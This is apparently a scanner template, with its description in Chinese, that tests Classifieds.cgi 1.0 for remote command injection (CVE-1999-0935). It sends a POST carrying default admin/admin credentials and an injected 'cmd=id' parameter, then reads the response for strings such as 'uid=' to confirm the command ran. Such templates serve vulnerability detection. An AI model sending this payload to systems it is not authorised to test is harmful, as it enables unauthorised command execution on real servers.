[info]
author = "ave"
description = "检测 Classifieds.cgi 1.0 是否存在隐藏变量命令注入漏洞。通过向 CGI 表单提交包含系统命令的隐藏参数，验证服务器是否执行了注入的命令。"
id = "POC-AVE-1999-1314"
name = "Classifieds.cgi 1.0 远程命令执行 PoC"
severity = "critical"
tags = ["ave-1999-1314"]
vuln_id = [
    "CVE-1999-0935",
    "AVE-1999-1314",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/classifieds.cgi"
protocol = "http"

[poc.requests.body]
content = "classified_id=1&user=admin&password=admin&action=view&cmd=id"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "uid=",
    "root:",
    "bin/",
]
